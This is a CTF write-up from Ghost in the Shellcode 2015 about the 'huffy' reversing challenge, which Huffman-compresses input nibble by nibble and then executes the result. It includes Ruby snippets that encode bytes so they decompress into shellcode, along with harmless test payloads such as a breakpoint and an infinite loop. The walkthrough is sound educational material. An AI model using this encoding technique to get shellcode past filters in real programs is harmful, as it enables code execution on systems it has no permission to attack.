---
id: 1980
title: 'GitS 2015: Huffy (huffman-encoded shellcode)'
date: '2015-02-04T13:58:12-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=1980'
permalink: /2015/gits-2015-huffy-huffman-encoded-shellcode
categories:
    - GITS2015
    - 'Reverse Engineering'
---

Welcome to my fourth and final writeup from Ghost in the Shellcode 2015! This one is about the one and only reversing level, called "[huffy](http://blogdata.skullsecurity.org/huffy)", that was released right near the end.

Unfortunately, while I thought I was solving it a half hour before the game ended, I had messed up some timezones and was finishing it a half hour after the game ended. So I didn't do the final exploitation step.

At any rate, I solved the hard part, so I'll go over the solution!

## Huffman Trees

Since the level was called "huffy", and I recently [solved a level involving Huffman Trees](/2014/defcon-quals-writeup-for-byhd-reversing-a-huffman-tree) in the Defcon qualifiers, my immediate thought was a Huffman Tree.

For those who don't know, a [Huffman Tree](https://en.wikipedia.org/wiki/Huffman_coding) is a fairly simple data structure used for data compression. The tree is constructed by reading the input and building a tree where the most common characters are near the top, and the least common are near the bottom.

To compress data, it traverses the tree to generate the encoded bits (left = 0, right = 1). The closer to the top something is, the less bits it encodes to. It's also a "[prefix code](https://en.wikipedia.org/wiki/Prefix_code)", which is a really neat property that means that no encoded bit string is a prefix of another one (in other words, when you're reading bits, you instantly know when you're done decoding one character).

For example, if you had a Huffman Tree that looked like:

```

       9
    /     \
   4       5 (o)
 /   \
d(3)  g(1)
```

You know that it was generated from text with 9 characters. 5 of the characters were 'o', 3 of the characters were 'd', and 1 of the characters were 'g'.

When you use it to compress data, you might compress "dog" like:

- d = 00 (left left)
- o = 1 (right)
- g = 01 (left right)

Therefore, "dog" would encode to the bits "00101".

If you saw the string of bits "01100", you could follow the tree: left right (g) right (o) left left (d) and get the string "god".

If there are equal numbers of each character in a string, and the number of unique characters is a power of 2, you wind up with a balanced tree.. for example, the string "aaabbbcccddd" would have the huffman tree:

```

       12
    /      \
   6        6
 /   \    /   \
a     b  c     d
```

And the string "abcd" will be encoded "00011011".

That property is going to be important. :)

## Understanding the program

When you run the program it prompts for input from stdin. If you give it input, it outputs a whole bunch of junk (although the output makes it a whole lot easier!).

Here's an example:

```

$ echo 'this is a test string' | ./huffy
CWD: /home/ron/gits2015/huffy
Nibble  Frequency
------  ---------
0       0.113636
1       0.022727
2       0.113636
3       0.090909
4       0.090909
5       0.022727
6       0.181818
7       0.227273
8       0.022727
9       0.068182
a       0.022727
b       0.000000
c       0.000000
d       0.000000
e       0.022727
f       0.000000

Read 22 bytes
Two lowest frequencies: 0.000000 and 0.000000
Two lowest frequencies: 0.000000 and 0.000000
Two lowest frequencies: 0.000000 and 0.000000
Two lowest frequencies: 0.000000 and 0.022727
Two lowest frequencies: 0.022727 and 0.022727
Two lowest frequencies: 0.022727 and 0.022727
Two lowest frequencies: 0.022727 and 0.045455
Two lowest frequencies: 0.045455 and 0.068182
Two lowest frequencies: 0.068182 and 0.090909
Two lowest frequencies: 0.090909 and 0.113636
Two lowest frequencies: 0.113636 and 0.113636
Two lowest frequencies: 0.159091 and 0.181818
Two lowest frequencies: 0.204545 and 0.227273
Two lowest frequencies: 0.227273 and 0.227273
Two lowest frequencies: 0.340909 and 0.431818
Two lowest frequencies: 0.454545 and 0.454545
Two lowest frequencies: 0.772727 and 0.909091
Breaking!
0 --0--> 0x9863348 --1--> 0x9863390 --1--> 0x98633c0 --1--> 0x98633d8
1 --0--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
2 --1--> 0x9863348 --1--> 0x9863390 --1--> 0x98633c0 --1--> 0x98633d8
3 --1--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
4 --0--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8
5 --0--> 0x98632d0 --0--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8
6 --1--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
7 --1--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8
8 --0--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
9 --1--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8
a --1--> 0x98632d0 --0--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8
b --0--> 0x9863258 --0--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
c --1--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
d --1--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
e --1--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
f --1--> 0x9863258 --0--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8
Encoding input...
ASCII Encoded: 011010000100000001010110110001111111100010101101100011111111000100001011111110011010000101010001100010110100111111100110001011010001111110010101100100001110010111110010101
Binary Encoded:
h@V????Q?O?-????
Executing encoded input...
Segmentation fault
```

It took me a little bit of time to see what's going on, but once you get it, it's pretty straight forward!

The first part is giving a frequency analysis of each nibble (a nibble being one hex character, or half of a byte). That tells me that it's compressing it via nibbles. Then it gives a frequency analysis of the input—I didn't worry too much about that—then it shows the encodings for each of the 16 possible nibbles.

After it encodes them, it takes those bits and converts them to a long binary string, then tries to run it.

So to summarize: you have to come up with some data that, when compressed nibble-by-nibble with Huffman encoding, will turn into something executable!

## Cleaning up the output

To make my life easier, I thought I'd use a bit of shell-fu to clean up the output so I can better understand what's going on:

```
<pre id="vimCodeElement">
$ <span class="Statement">echo</span><span class="Constant"> </span><span class="Statement">'</span><span class="Constant">this is a test string</span><span class="Statement">'</span><span class="Constant"> </span>| ./huffy | <span class="Statement">sed</span> <span class="Special">-re</span> <span class="Statement">'</span><span class="Constant">s/ --/ /</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .{9} --//g</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .*//</span><span class="Statement">'</span>
```

Which produces the output:

```

[...]
0 0111
1 010000
2 1111
3 1000
4 0010
5 001010
6 100
7 110
8 00000
9 11010
a 101010
b 0000110000
c 10110000
d 100110000
e 1110000
f 1000110000
Encoding input...
ASCII Encoded: 011010000100000001010110110001111111100010101101100011111111000100001011111110011010000101010001100010110100111111100110001011010001111110010101100100001110010111110010101
```

If you try to give it "AAAA", you wind up with this table:

```

$ <span class="Statement">echo</span><span class="Constant"> </span><span class="Statement">'</span><span class="Constant">AAAA</span><span class="Statement">'</span><span class="Constant"> </span>| ./huffy | <span class="Statement">sed</span> <span class="Special">-re</span> <span class="Statement">'</span><span class="Constant">s/ --/ /</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .{9} --//g</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .*//</span><span class="Statement">'</span>
[...]
0 0101
1 0
2 0000000000001101
3 101101
4 11
5 1001101
6 10001101
7 100001101
8 1000001101
9 10000001101
a 11101
b 100000001101
c 1000000001101
d 10000000001101
e 100000000001101
f 1000000000001101
Encoding input...
ASCII Encoded: 110110110110101010111
Binary Encoded:
```

You probably know that AAAA = "41414141", so '4' and '1' are the most common nibbles. That's borne out in the table, too, with '4' being encoded as '11' and '1' being encoded as '0'. We also expect to see a newline at the end - "\\x0a" - so the '0' and 'a' should also be encoded there.

If we break apart the characters, we see this string:

```

ASCII Encoded: 11 0 11 0 11 0 11 0 1010 10111
```

One thing to note is that everything is going to be backwards from how you see it on the table! 11 and 0 don't actually matter, but 1010 = 0101 = '0', and 10111 = 11101 = 'a'. I honestly didn't notice that during the actual game, though, I worked around that problem in a creative way. :)

## Balancing it out

Remember I mentioned earlier that if you have a balanced tree with a power-of-two number of nodes, all characters are encoded to the same number of bits? Well, it turns out that there are 16 different nibbles, so if you have an even number of each nibble in your input string, they each encode to 4 bits:

```

$ <span class="Statement">echo</span><span class="Constant"> -ne </span><span class="Statement">'</span><span class="Constant">\x01\x23\x45\x67\x89\xab\xcd\xef</span><span class="Statement">'</span><span class="Constant"> </span>| ./huffy | <span class="Statement">sed</span> <span class="Special">-re</span> <span class="Statement">'</span><span class="Constant">s/ --/ /</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .{9} --//g</span><span class="Statement">'</span> <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">s/--> .*//</span><span class="Statement">'</span>
0 0000
1 0001
2 0011
3 0010
4 0110
5 0111
6 0101
7 0100
8 1100
9 1101
a 1111
b 1110
c 1010
d 1011
e 1001
f 1000
```

And not only do they each encode to 4 bits, every possible 4-bit value is there, too!

## Exploit

The exploit now is just a matter of...

1. Figuring out which nibbles encode to which bits
2. Writing those nibbles out as shellcode
3. Padding the shellcode till you have the same number of each nibble

That's all pretty straight forward! Check out [my full exploit](https://blogdata.skullsecurity.org/huffy-sploit.rb), or piece it together from the snippits below :)

First, create a table (I did this by hand):

```
<pre id="vimCodeElement">
<span class="Identifier">@@table</span> = {
  <span class="Special">"</span><span class="Constant">0000</span><span class="Special">"</span> => <span class="Constant">0x0</span>, <span class="Special">"</span><span class="Constant">0001</span><span class="Special">"</span> => <span class="Constant">0x1</span>, <span class="Special">"</span><span class="Constant">0011</span><span class="Special">"</span> => <span class="Constant">0x2</span>, <span class="Special">"</span><span class="Constant">0010</span><span class="Special">"</span> => <span class="Constant">0x3</span>,
  <span class="Special">"</span><span class="Constant">0110</span><span class="Special">"</span> => <span class="Constant">0x4</span>, <span class="Special">"</span><span class="Constant">0111</span><span class="Special">"</span> => <span class="Constant">0x5</span>, <span class="Special">"</span><span class="Constant">0101</span><span class="Special">"</span> => <span class="Constant">0x6</span>, <span class="Special">"</span><span class="Constant">0100</span><span class="Special">"</span> => <span class="Constant">0x7</span>,
  <span class="Special">"</span><span class="Constant">1100</span><span class="Special">"</span> => <span class="Constant">0x8</span>, <span class="Special">"</span><span class="Constant">1101</span><span class="Special">"</span> => <span class="Constant">0x9</span>, <span class="Special">"</span><span class="Constant">1111</span><span class="Special">"</span> => <span class="Constant">0xa</span>, <span class="Special">"</span><span class="Constant">1110</span><span class="Special">"</span> => <span class="Constant">0xb</span>,
  <span class="Special">"</span><span class="Constant">1010</span><span class="Special">"</span> => <span class="Constant">0xc</span>, <span class="Special">"</span><span class="Constant">1011</span><span class="Special">"</span> => <span class="Constant">0xd</span>, <span class="Special">"</span><span class="Constant">1001</span><span class="Special">"</span> => <span class="Constant">0xe</span>, <span class="Special">"</span><span class="Constant">1000</span><span class="Special">"</span> => <span class="Constant">0xf</span>,
}
```

Then encode the shellcode:

```

<span class="rubyDefine">def</span> <span class="Identifier">encode_nibble</span>(b)
  binary = b.to_s(<span class="Constant">2</span>).rjust(<span class="Constant">4</span>, <span class="Special">'</span><span class="Constant">0</span><span class="Special">'</span>)
  puts(<span class="Special">"</span><span class="Constant">Looking up %s... => %x</span><span class="Special">"</span> % [binary, <span class="Identifier">@@table</span>[binary]])
  <span class="Statement">return</span> <span class="Identifier">@@table</span>[binary]
<span class="rubyDefine">end</span>

<span class="Identifier">@@hist</span> = [ <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, <span class="Constant">0</span>, ]

<span class="Comment">#shellcode = "\xeb\xfe"</span>
<span class="Comment">#shellcode = "\xcd\x03"</span>
shellcode = <span class="Special">"</span><span class="Constant">hello world, this is my shellcode!</span><span class="Special">"</span>
shellcode.each_byte <span class="Statement">do</span> |<span class="Identifier">b</span>|
  n1 = b >> <span class="Constant">4</span>
  n2 = b & <span class="Constant">0x0f</span>

  puts(<span class="Special">"</span><span class="Constant">n1 = %x</span><span class="Special">"</span> % n1)
  puts(<span class="Special">"</span><span class="Constant">n2 = %x</span><span class="Special">"</span> % n2)

  <span class="Identifier">@@hist</span>[n1] += <span class="Constant">1</span>
  <span class="Identifier">@@hist</span>[n2] += <span class="Constant">1</span>

  out += ((encode_nibble(n1) << <span class="Constant">4</span>) | (encode_nibble(n2) & <span class="Constant">0x0F</span>)).chr
<span class="Statement">end</span>
```

Notice that I maintain a histogram, that makes the final step easier, padding the string as needed:

```

<span class="rubyDefine">def</span> <span class="Identifier">get_padding</span>()
  result = <span class="Special">""</span>
  max = <span class="Identifier">@@hist</span>.max

  needed_nibbles = []
  <span class="Constant">0</span>.upto(<span class="Identifier">@@hist</span>.length - <span class="Constant">1</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
    needed_nibbles << [i] * (max - <span class="Identifier">@@hist</span>[i])
    needed_nibbles.flatten!
  <span class="Statement">end</span>

  <span class="Statement">if</span>((needed_nibbles.length % <span class="Constant">2</span>) != <span class="Constant">0</span>)
    puts(<span class="Special">"</span><span class="Constant">We need an odd number of nibbles! Add some NOPs or something :(</span><span class="Special">"</span>)
    <span class="Statement">exit</span>
  <span class="Statement">end</span>

  <span class="Constant">0</span>.step(needed_nibbles.length - <span class="Constant">1</span>, <span class="Constant">2</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
    n1 = needed_nibbles[i]
    n2 = needed_nibbles[i+<span class="Constant">1</span>]

    result += ((encode_nibble(n1) << <span class="Constant">4</span>) | (encode_nibble(n2) & <span class="Constant">0x0f</span>)).chr
  <span class="Statement">end</span>

  <span class="Statement">return</span> result
<span class="rubyDefine">end</span>
```

And now "out" should contain a bunch of nibbles that will map to shellcode! Should!

Finally, we output it:

```

<span class="rubyDefine">def</span> <span class="Identifier">output</span>(str)
  print <span class="Special">"</span><span class="Constant">echo -ne '</span><span class="Special">"</span>
  str.bytes.each <span class="Statement">do</span> |<span class="Identifier">b</span>|
    print(<span class="Special">"</span><span class="Special">\\</span><span class="Constant">x%02x</span><span class="Special">"</span> % b)
  <span class="Statement">end</span>
  puts(<span class="Special">"</span><span class="Constant">' > in; ./huffy < in</span><span class="Special">"</span>)
<span class="rubyDefine">end</span>
```

## Hacking around a bug

Did you notice what I did wrong? I made a big mistake, and in the heat of the contest I didn't have time to fix it properly. When I tried to encode "hello world, this is my shellcode!", I get:

```

<span class="Statement">echo</span><span class="Constant"> -ne </span><span class="Statement">'</span><span class="Constant">\x4f\x46\x48\x48\x4a\x30\x55\x4a\x53\x48\x47\x38\x30\x57\x4f\x4e\x52\x30\x4e\x52\x30\x49\x5e\x30\x52\x4f\x46\x48\x48\x42\x4a\x47\x46\x31\x00\x00\x00\x00\x00\x00\x00\x01\x11\x11\x11\x11\x11\x11\x11\x11\x11\x33\x33\x33\x33\x33\x33\x22\x22\x22\x22\x22\x22\x22\x22\x77\x77\x77\x77\x77\x77\x77\x77\x76\x66\x66\x66\x66\x66\x66\x66\x66\x55\x55\x55\x55\x55\x55\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xee\xee\xee\xee\xee\xee\xee\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\x88\x88\x88\x88\x88\x88\x88\x99\x99\x99\x99\x99\x99\x99\x99\x99\x9b\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xba\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa</span><span class="Statement">'</span><span class="Constant"> </span><span class="Statement">></span> <span class="Error">in</span>; ./huffy <span class="Statement"><</span> <span class="Error">in</span>
```

Which works out to:

```

ajcco@?o?cbC@?ai?@i?@k?@?ajcclobj?????????DDDDDD????????""""""""*??????????????????????UUUUUUUUUU??????????3333333??????????wwwwwwwww????????
```

That's not my string! What's the deal?

But notice the string starts with "ajcco" - that kidna looks like "hello". And the 4-bits-per-character thing is holding up, we can see:

```

0 0000
1 0001
2 0011
3 0010
4 0110
5 0111
6 0101
7 0100
8 1100
9 1101
a 1111
b 1110
c 1010
d 1011
e 1001
f 1000
```

So it's kinda working! Kinnnnnda!

To work on this, I tried the shellcode

```
"\x01\x23\x45\x67\x89\xab\xcd\xef"
```

and determined that it encoded to: "<tt>0000100001001100001010100110111000011001010111010011101101111111</tt>", which is, in hex:

```
"\x08\x4c\x3a\x6e\x19\x5d\x3b\x7f"
```

Or, to list the nibbles:

```

0000
1000
0100
1100
0010
1010
0110
1110
0001
1001
0101
1101
0011
1011
0111
1111
```

If I was paying more attention, I would have noticed the obvious problem: **they're backwards**!!!

In my rush to get the level done, I didn't notice that every nibble's bits were exactly backwards (1000 instead of 0001, 0100 instead of 0010, etc etc)

While I didn't notice the problem, I did notice that everything was consistently wrong. So I did this:

```
<pre id="vimCodeElement">
hack_table = {
  0x02 =<span class="Error">></span> 0x08, 0x0d =<span class="Error">></span> 0x09, 0x00 =<span class="Error">></span> 0x00, 0x08 =<span class="Error">></span> 0x02,
  0x0f =<span class="Error">></span> 0x01, 0x07 =<span class="Error">></span> 0x03, 0x03 =<span class="Error">></span> 0x07, 0x0c =<span class="Error">></span> 0x06,
  0x04 =<span class="Error">></span> 0x04, 0x0b =<span class="Error">></span> 0x05, 0x01 =<span class="Error">></span> 0x0f, 0x0e =<span class="Error">></span> 0x0e,
  0x06 =<span class="Error">></span> 0x0c, 0x09 =<span class="Error">></span> 0x0d, 0x05 =<span class="Error">></span> 0x0b, 0x0a =<span class="Error">></span> 0x0a
}

hack_out = ""

out.bytes.each do |b|
  n1 = hack_table[b <span class="Error">>></span> 4]
  n2 = hack_table[b <span class="Error">&</span> 0x0f]

  hack_out += ((n1 <span class="htmlTag"><</span><span class="Error"><</span><span class="htmlTag"> 4) | (n2 & 0x000f)).chr</span>
<span class="htmlTag">end</span>
<span class="htmlTag">output(hack_out)</span>
```

And ran it with the original test shellcode:

```

$ ruby ./sploit.rb
echo -ne '\x41\x4c\x42\x42\x4a\x70\xbb\x4a\xb7\x42\x43\x72\x70\xb3\x41\x4e\xb8\x70\x4e\xb8\x70\x4d\xbe\x70\xb8\x41\x4c\x42\x42\x48\x4a\x43\x4c\x7f\x00\x00\x00\x00\x00\x00\x00\x0f\xff\xff\xff\xff\xff\xff\xff\xff\xff\x77\x77\x77\x77\x77\x77\x88\x88\x88\x88\x88\x88\x88\x88\x33\x33\x33\x33\x33\x33\x33\x33\x3c\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xbb\xbb\xbb\xbb\xbb\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x1e\xee\xee\xee\xee\xee\xee\xee\xee\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x22\x22\x22\x22\x22\x22\x22\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xd5\x55\x55\x55\x55\x55\x55\x55\x55\x55\x5a\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' > in; ./huffy < in
```

Then run the code I got:

```

$ echo -ne '\x41\x4c\x42\x42\x4a\x70\xbb\x4a\xb7\x42\x43\x72\x70\xb3\x41\x4e\xb8\x70\x4e\xb8\x70\x4d\xbe\x70\xb8\x41\x4c\x42\x42\x48\x4a\x43\x4c\x7f\x00\x00\x00\x00\x00\x00\x00\x0f\xff\xff\xff\xff\xff\xff\xff\xff\xff\x77\x77\x77\x77\x77\x77\x88\x88\x88\x88\x88\x88\x88\x88\x33\x33\x33\x33\x33\x33\x33\x33\x3c\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xbb\xbb\xbb\xbb\xbb\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x1e\xee\xee\xee\xee\xee\xee\xee\xee\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x22\x22\x22\x22\x22\x22\x22\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xd5\x55\x55\x55\x55\x55\x55\x55\x55\x55\x5a\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' > in; ./huffy < in
```

Binary Encoded:

```

hello world, this is my shellcode!""""""33333333DDDDDDDDEUUUUUUUUwwwwww????????????????????????????????????????????????????????????????????????
Executing encoded input...
Segmentation fault
```

That's better! It decoded it properly thanks to my little hack! Not let's try my two favourite test strings, "\\xcd\\x03" (debug breakpoint, can also use "\\xcc") and "\\xeb\\xfe" (infinite loop):

```

$ ruby ./sploit.rb
echo -ne '\x2d\x08\xf7\x3c\x4b\x1e\x69\x5a' > in; ./huffy < in

$ echo -ne '\x2d\x08\xf7\x3c\x4b\x1e\x69\x5a' > in; ./huffy < in
Binary Encoded:
?Eg???
Executing encoded input...
Trace/breakpoint trap

$ ruby ./sploit.rb
echo -ne '\x59\xa5\x00\xff\x77\x88\x33\xcc\x44\xbb\x11\xee\x66\x92\x2d\xda' > in; ./huffy < in

$ echo -ne '\x59\xa5\x00\xff\x77\x88\x33\xcc\x44\xbb\x11\xee\x66\x92\x2d\xda' > in; ./huffy < in
Binary Encoded:
??"3DUfw??????
Executing encoded input...
[...infinite loop...]
```

At this point, I had run out of time (damn you timezones!) and didn't finish up.

## Summary

This was, as I mentioned, a pretty straight forward Huffman-Tree level.

It compresses your input, nibble-by-nibble, and runs the result.

I gave it some input to ensure the tree is balanced, where each nibble produces 4 bits, then we encoded the shellcode as such.

When I realized I was getting the wrong output, rather than reversing the bit strings, which I hadn't realize were backwards until just now, I made a little table to translate them correctly.

Then we encode the shellcode, and we win!

The last step would be to find appropriate shellcode, pad the message to always be 1024 nibbles (like the server wants), and send it off!